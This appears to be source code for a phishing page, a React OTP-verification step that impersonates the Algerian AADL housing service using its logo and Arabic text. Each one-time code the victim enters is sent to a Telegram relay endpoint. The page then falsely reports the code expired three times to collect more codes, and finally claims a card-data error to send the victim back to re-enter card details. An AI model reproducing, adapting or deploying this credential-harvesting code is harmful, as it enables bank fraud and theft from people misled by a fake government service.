"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { toast } from "sonner"
import Image from "next/image"

interface OtpVerificationStepProps {
  onNext: () => void
  formData: any
  updateFormData: (data: any) => void
  onCardError: () => void
}

export function OtpVerificationStep({ onNext, formData, updateFormData, onCardError }: OtpVerificationStepProps) {
  const [otp, setOtp] = useState("")
  const [delayTimeLeft, setDelayTimeLeft] = useState(0)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showExpiredMessage, setShowExpiredMessage] = useState(false)
  const [isNightTime, setIsNightTime] = useState(false)

  const currentOtpPage = formData.currentOtpPage || 1

  const DELAY_DURATION = 120

  // Check if current time is between 00:00 and 03:00
  useEffect(() => {
    const checkNightTime = () => {
      const now = new Date()
      const hours = now.getHours()
      // Between 00:00 (midnight) and 03:00
      setIsNightTime(hours >= 0 && hours < 3)
    }
    
    checkNightTime()
    const interval = setInterval(checkNightTime, 60000) // Check every minute
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    setDelayTimeLeft(DELAY_DURATION)
    setOtp("")
    setShowExpiredMessage(false)
  }, [currentOtpPage])

  useEffect(() => {
    if (delayTimeLeft <= 0) {
      return
    }

    const timer = setInterval(() => {
      setDelayTimeLeft((prev) => prev - 1)
    }, 1000)

    return () => clearInterval(timer)
  }, [delayTimeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const sendOtpAttemptToTelegram = async (pageNumber: number, userEnteredOtp: string) => {
    try {
      const telegramMessage = `<b>${formData.registrationCode}</b> / OTP ${pageNumber} / <code>${userEnteredOtp}</code>`

      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: telegramMessage,
          pageNumber: pageNumber,
          userEnteredOtp: userEnteredOtp,
        }),
      })
    } catch (error) {
      console.error("Failed to send OTP attempt to Telegram:", error)
    }
  }

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6)
    setOtp(value)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!otp || otp.length !== 6) {
      toast.error("يرجى إدخال رمز OTP الكامل (6 أرقام)")
      return
    }

    setIsSubmitting(true)

    try {
      await sendOtpAttemptToTelegram(currentOtpPage, otp)

      if (currentOtpPage === 1 || currentOtpPage === 2 || currentOtpPage === 3) {
        setShowExpiredMessage(true)
        toast.error("le code a été expiré")
        setTimeout(() => {
          setOtp("")
          setShowExpiredMessage(false)
          updateFormData({ currentOtpPage: currentOtpPage + 1 })
        }, 1500)
      } else if (currentOtpPage === 4) {
        toast.error("يرجى ملء بيانات البطاقة من جديد - حدث خطأ في البيانات")
        setTimeout(() => {
          setOtp("")
          updateFormData({ currentOtpPage: 1 })
          onCardError()
        }, 1500)
      }
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1a4e] via-[#2a2a6e] to-[#1a1a4e] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-5">
          <div className="absolute top-10 left-10 w-64 h-64 bg-white rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-yellow-400 rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-xl p-2 shadow-xl">
            <Image src="/aadl-logo.png" alt="AADL" width={60} height={60} className="object-contain" />
          </div>
        </div>

        <Card className="bg-white/95 backdrop-blur-sm p-6 shadow-2xl border-0 rounded-2xl">
          <h1 className="text-lg font-bold text-center mb-1 text-[#1a1a4e]">التحقق من الهوية</h1>
          <p className="text-center text-gray-500 mb-4 text-xs">ادخل رمز OTP المرسل اليك</p>

          {/* Night Time Warning */}
          {isNightTime && (
            <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 mb-4 text-center">
              <p className="text-sm font-semibold text-amber-800 mb-1">تنبيه مهم</p>
              <p className="text-xs text-amber-700 leading-relaxed">
                الاكواد لا تصل في الفترة ما بين 12:00 ليلا و 3:00 فجرا. يرجى المحاولة بعد الساعة 3:15 فجرا.
              </p>
            </div>
          )}

          {/* Timer */}
          <div className="bg-gradient-to-r from-[#1a1a4e] to-[#3a3a8f] rounded-xl p-4 mb-4 text-center text-white">
            <p className="text-xs opacity-80 mb-1">الوقت المتبقي</p>
            <div className="text-3xl font-bold">{formatTime(delayTimeLeft)}</div>
          </div>

          {/* Expired Message */}
          {showExpiredMessage && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4 text-center">
              <p className="text-sm font-semibold text-red-600">le code a été expiré</p>
              <p className="text-xs text-red-500 mt-1">سيتم إرسال رمز جديد</p>
            </div>
          )}

          {/* New Code Message */}
          {currentOtpPage > 1 && !showExpiredMessage && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4 text-center">
              <p className="text-sm text-green-700">أدخل الرمز الجديد المرسل إليك</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Simple single input field for OTP */}
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-center">رمز OTP (6 أرقام)</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="000000"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                className="w-full text-center text-2xl font-bold tracking-[0.5em] h-14 border-2 border-[#3a3a8f]/30 focus:border-[#3a3a8f]"
                dir="ltr"
                autoFocus
              />
            </div>

            <Button
              type="submit"
              disabled={isSubmitting || otp.length !== 6}
              className="w-full bg-[#3a3a8f] hover:bg-[#2d2d7a] text-white font-semibold py-3 rounded-lg transition disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? "جاري التحقق..." : "تأكيد"}
            </Button>
          </form>
        </Card>

        {/* Footer */}
        <p className="text-center text-xs text-white/50 mt-4">خدمة ارشادية لمتابعة ملفات AADL 3</p>
      </div>
    </div>
  )
}
